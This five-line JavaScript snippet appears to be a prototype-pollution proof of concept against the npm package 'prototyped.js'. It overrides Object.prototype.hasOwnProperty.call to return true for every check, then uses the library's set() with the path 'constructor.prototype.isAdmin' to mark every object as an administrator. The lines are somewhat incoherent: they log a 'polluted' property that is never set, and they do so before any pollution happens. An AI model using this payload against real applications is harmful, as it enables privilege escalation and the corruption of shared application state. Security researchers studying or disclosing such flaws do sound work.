Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
console.log({}.polluted);
const set = require('prototyped.js/dist/object/set').default;
set({}, 'constructor.prototype.isAdmin', true);